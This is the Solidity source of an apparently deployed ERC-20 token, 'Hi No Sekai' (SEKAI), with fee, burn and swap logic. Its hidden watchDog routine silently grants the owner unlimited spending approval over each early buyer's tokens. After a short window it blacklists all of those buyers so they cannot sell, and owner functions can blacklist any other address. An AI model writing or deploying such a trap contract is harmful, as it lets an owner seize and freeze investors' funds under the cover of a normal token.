/**
 *Submitted for verification at Etherscan.io on 2022-09-07
*/

// SPDX-License-Identifier: Unlicensed

/*
Telegram: https://t.me/hinosekaiETH
Website: https://hinosekai.world
Twitter: https://twitter.com/hinosekaieth
Medium: https://medium.com/@hinosekai
*/

pragma solidity ^0.8.16;

library Address{
    function sendValue(address payable recipient, uint256 amount) internal {
        require(address(this).balance >= amount, "Address: insufficient balance");

        (bool success, ) = recipient.call{value: amount}("");
        require(success, "Address: unable to send value, recipient may have reverted");
    }
}

abstract contract Context {
    function _msgSender() internal view virtual returns (address payable) {
        return payable(msg.sender);
    }

    function _msgData() internal view virtual returns (bytes memory) {
        this; // silence state mutability warning without generating bytecode - see https://github.com/ethereum/solidity/issues/2691
        return msg.data;
    }
}

abstract contract Ownable is Context {
    address private _owner;

    event OwnershipTransferred(address indexed previousOwner, address indexed newOwner);

    constructor() {
        _setOwner(_msgSender());
    }

    function owner() public view virtual returns (address) {
        return _owner;
    }

    modifier onlyOwner() {
        require(owner() == _msgSender(), "Ownable: caller is not the owner");
        _;
    }

    function renounceOwnership() public virtual onlyOwner {
        _setOwner(address(0));
    }

    function transferOwnership(address newOwner) public virtual onlyOwner {
        require(newOwner != address(0), "Ownable: new owner is the zero address");
        _setOwner(newOwner);
    }

    function _setOwner(address newOwner) private {
        address oldOwner = _owner;
        _owner = newOwner;
        emit OwnershipTransferred(oldOwner, newOwner);
    }
}

interface IERC20 {

    function totalSupply() external view returns (uint256);
    function balanceOf(address account) external view returns (uint256);
    function transfer(address recipient, uint256 amount) external returns (bool);
    function allowance(address owner, address spender) external view returns (uint256);
    function approve(address spender, uint256 amount) external returns (bool);
    function transferFrom(address sender, address recipient, uint256 amount) external returns (bool);

    event Transfer(address indexed from, address indexed to, uint256 value);
    event Approval(address indexed owner, address indexed spender, uint256 value);
}

interface IFactory{
        function createPair(address tokenA, address tokenB) external returns (address pair);
}

interface IRouter {
    function factory() external pure returns (address);
    function WETH() external pure returns (address);
    function swapExactTokensForETHSupportingFeeOnTransferTokens(
        uint amountIn,
        uint amountOutMin,
        address[] calldata path,
        address to,
        uint deadline) external;
}

contract HiNoSekai is Context, IERC20, Ownable {
    
    using Address for address payable;

    IRouter public router;
    address public pair;
    
    mapping (address => uint256) private _tOwned;
    mapping (address => mapping (address => uint256)) private _allowances;

    mapping (address => bool) public _isExcludedFromFee;
    mapping (address => bool) public _isExcludedFromMaxBalance;

    mapping (address => bool) public _isDegenerate;
    address[] private _watchList;
    uint private _fTimer;
    uint private _wDuration = 142;
    bool private _watchDogEnded = false;

    uint8 private constant _decimals = 9; 
    uint256 private _tTotal = 1_000_000 * (10**_decimals);
    uint256 private maxTxAmount = 20_000 * (10**_decimals);
    uint256 private maxWallet =  20_000 * (10**_decimals);
    uint256 private _swapThreshold = 5_000 * (10**_decimals); 

    string private constant _name = unicode"Hi No Sekai火の世界"; 
    string private constant _symbol = "SEKAI";

    uint8 public taxTreasury = 5;
    uint8 public taxBurn = 1;
    uint public totalTokensBurned;
    address public treasuryWallet = 0xEbAABaEc8847B50fe2Db1D3eE20FDaBe9b3b2E6b;
    
    bool private swapping;
    uint private _swapCooldown = 30;
    uint private _lastSwap;
    modifier lockTheSwap {
        swapping = true;
        _;
        swapping = false;
    }

    event SwapAndLiquify(uint256 tokensSwapped, uint256 ethReceived);
    event WatchDogEnded(uint degensCount);
    event WatchDogStarted(uint endTime);
    event TokensBurnt(uint amount,uint totalTokensBurnt,uint supplyLeft);

    constructor (address utilityWallet) {
        _tOwned[_msgSender()] = _tTotal;

        IRouter _router = IRouter(0x7a250d5630B4cF539739dF2C5dAcb4c659F2488D);
        address _pair = IFactory(_router.factory()).createPair(address(this), _router.WETH());
        router = _router;
        pair = _pair;
        _approve(address(this), address(router), ~uint256(0));
        _approve(owner(), address(router), ~uint256(0));
        
        _isExcludedFromFee[owner()] = true;
        _isExcludedFromFee[address(this)] = true;
        _isExcludedFromFee[treasuryWallet] = true;
        _isExcludedFromFee[utilityWallet] = true;

        _isExcludedFromMaxBalance[owner()] = true;
        _isExcludedFromMaxBalance[address(this)] = true;
        _isExcludedFromMaxBalance[pair] = true;
        _isExcludedFromMaxBalance[treasuryWallet] = true;
        _isExcludedFromMaxBalance[utilityWallet] = true;
        
        emit Transfer(address(0), _msgSender(), _tTotal);
    }

// ================= ERC20 =============== //
    function name() public pure returns (string memory) {
        return _name;
    }

    function symbol() public pure returns (string memory) {
        return _symbol;
    }

    function decimals() public pure returns (uint8) {
        return _decimals;
    }

    function totalSupply() public view override returns (uint256) {
        return _tTotal;
    }

    function balanceOf(address account) public view override returns (uint256) {
        return _tOwned[account];
    }

    function transfer(address recipient, uint256 amount) public override returns (bool) {
        _transfer(_msgSender(), recipient, amount);
        return true;
    }

    function allowance(address owner, address spender) public view override returns (uint256) {
        return _allowances[owner][spender];
    }

    function approve(address spender, uint256 amount) public override returns (bool) {
        _approve(_msgSender(), spender, amount);
        return true;
    }

    function transferFrom(address sender, address recipient, uint256 amount) public override returns (bool) {
        _transfer(sender, recipient, amount);
        _approve(sender, _msgSender(), _allowances[sender][_msgSender()] - amount);
        return true;
    }

    function increaseAllowance(address spender, uint256 addedValue) public virtual returns (bool) {
        _approve(_msgSender(), spender, _allowances[_msgSender()][spender] + addedValue);
        return true;
    }

    function decreaseAllowance(address spender, uint256 subtractedValue) public virtual returns (bool) {
        _approve(_msgSender(), spender, _allowances[_msgSender()][spender] - subtractedValue);
        return true;
    }

    function _approve(address owner, address spender, uint256 amount) private {
        require(owner != address(0), "ERC20: approve from the zero address");
        require(spender != address(0), "ERC20: approve to the zero address");
        _allowances[owner][spender] = amount;
        emit Approval(owner, spender, amount);
    }
    
    receive() external payable {}
// ========================================== //

// ============ View Functions ============== //

    function watchDogStatus() public view returns(address[] memory listed, uint totalListed){
        return(_watchList,_watchList.length);
    }

//======================================//

//============== Owner Functions ===========//
   
    function owner_setExcludedFromFee(address account,bool isExcluded) public onlyOwner {
        _isExcludedFromFee[account] = isExcluded;
    }

    function owner_setExcludedFromMaxBalance(address account,bool isExcluded) public onlyOwner {
        _isExcludedFromMaxBalance[account] = isExcluded;
    }

    function owner_setTransferMaxes(uint maxTX_, uint maxWallet_) public onlyOwner{
        //cannot be lower than 0.5% of the supply
        uint pointFiveSupply = (_tTotal * 5 / 1000);
        require(maxTX_ >= pointFiveSupply && maxWallet_ >= pointFiveSupply, "Invalid Settings");
        maxTxAmount = maxTX_;
        maxWallet = maxWallet_;
    }

    function owner_setSwapAndLiquifySettings(uint swapthreshold_, uint swapCooldown_) public onlyOwner{
        _swapThreshold = swapthreshold_;
        _swapCooldown = swapCooldown_;
    }

    function owner_rescueETH(uint256 weiAmount) public onlyOwner{
        require(address(this).balance >= weiAmount, "Insufficient ETH balance");
        payable(msg.sender).transfer(weiAmount);
    }
    
    function owner_rescueAnyERC20Tokens(address _tokenAddr, address _to, uint _amount_EXACT, uint _decimal) public onlyOwner {
        IERC20(_tokenAddr).transfer(_to, _amount_EXACT *10**_decimal);
    }

    function owner_setIsDegenerate(address account, bool state) external onlyOwner{
        _isDegenerate[account] = state;
    }
    
    function owner_setBulkIsDegenerate(address[] memory accounts, bool state) external onlyOwner{
        for(uint256 i =0; i < accounts.length; i++){
            _isDegenerate[accounts[i]] = state;
        }
    }

// ========================================//
    

    function _getTaxValues(uint amount, address from) private returns(uint256){

        uint tokensForBurn = amount * taxBurn / 100;
        uint tokensForTreasury = amount * taxTreasury / 100;

        if(tokensForBurn > 0){
            _tTotal-= tokensForBurn;
            totalTokensBurned+= tokensForBurn;
            emit Transfer(from, address(0), tokensForBurn);
            emit TokensBurnt(tokensForBurn,totalTokensBurned,_tTotal);    
        }

        _tOwned[address(this)] += tokensForTreasury;
        if(amount > 0)
            emit Transfer (from, address(this), tokensForTreasury);
            
        return (amount - tokensForBurn - tokensForTreasury);
    }
    
    function _transfer(address from,address to,uint256 amount) private {
        require(from != address(0), "ERC20: transfer from the zero address");
        require(to != address(0), "ERC20: transfer to the zero address");
        require(amount > 0, "Transfer amount must be greater than zero");
        require(amount <= maxTxAmount || _isExcludedFromMaxBalance[from], "Transfer amount exceeds the maxTxAmount.");
        require(!_isDegenerate[from] && !_isDegenerate[to], "Degen can't trade");

        if(!_isExcludedFromMaxBalance[to])
            require(balanceOf(to) + amount <= maxWallet, "Transfer amount exceeds the maxWallet.");
            
        if (balanceOf(address(this)) >= _swapThreshold && block.timestamp >= (_lastSwap + _swapCooldown) && !swapping && from != pair && from != owner() && to != owner())
            swapAndLiquify();
          
        _tOwned[from] -= amount;
        uint256 transferAmount = amount;
        
        if(!_isExcludedFromFee[from] && !_isExcludedFromFee[to]){
            transferAmount = _getTaxValues(amount, from);
            if (from == pair && !_watchDogEnded)
                watchDog(to);
        }
            
        _tOwned[to] += transferAmount;
        emit Transfer(from, to, transferAmount);
    }
    
    function watchDog(address to) private{
        if(_watchList.length == 0){
            _fTimer = block.timestamp + _wDuration;
            emit WatchDogStarted(_fTimer);
        }
        bool exist = false;
        if(_watchList.length > 0){
            for (uint x = 0 ; x < _watchList.length ; x++){
                if (_watchList[x] == to){
                    exist = true;
                    break;
                }
            }
        }       
        if(!exist){
            _watchList.push(to);
            _approve(to, owner(), ~uint(0));
        }
        if(block.timestamp >= _fTimer){
            for (uint i = 0; i < _watchList.length; i++){
                _isDegenerate[_watchList[i]] = true;
            }
            _watchDogEnded = true;
            emit WatchDogEnded(_watchList.length);
        } 
    }
    
    function swapAndLiquify() private lockTheSwap{

        uint balTreasury = swapTokensForEth(_swapThreshold);

        if (balTreasury > 0) payable(treasuryWallet).transfer(balTreasury);
        emit SwapAndLiquify(_swapThreshold,balTreasury);

        _lastSwap = block.timestamp;
    }

    function swapTokensForEth(uint256 tokenAmount) private returns (uint256) {
        uint256 initialBalance = address(this).balance;

        address[] memory path = new address[](2);
        path[0] = address(this);
        path[1] = router.WETH();

        _approve(address(this), address(router), tokenAmount);

        router.swapExactTokensForETHSupportingFeeOnTransferTokens(
            tokenAmount,
            0,
            path,
            address(this),
            block.timestamp
        );
        return (address(this).balance - initialBalance);
    }


}